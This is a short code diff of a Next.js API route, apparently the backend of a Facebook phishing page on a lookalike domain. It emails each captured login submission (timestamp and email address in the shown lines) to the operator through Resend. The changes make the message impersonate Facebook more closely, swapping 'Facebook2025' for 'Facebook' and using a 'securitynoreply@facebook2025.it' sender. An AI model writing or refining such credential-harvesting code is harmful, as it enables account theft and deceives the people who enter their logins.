@@ -13,7 +13,7 @@ export async function POST(req: NextRequest) {
     const emailTo = process.env.EMAIL_TO;
 
     const message = `
-📩 Nuovo accesso su Facebook2025.it
+📩 Nuovo accesso su Facebook.it
 
 🕓 Orario: ${timestamp}
 📧 Email: ${email}
@@ -21,9 +21,9 @@ export async function POST(req: NextRequest) {
 `;
 
     await resend.emails.send({
-      from: 'facebook2025@grisu.it', // puoi personalizzarlo
+      from: 'securitynoreply@facebook2025.it', // puoi personalizzarlo
       to: emailTo!,
-      subject: 'Nuovo login da Facebook2025',
+      subject: 'Nuovo login da Facebook',
       text: message,
     });
 
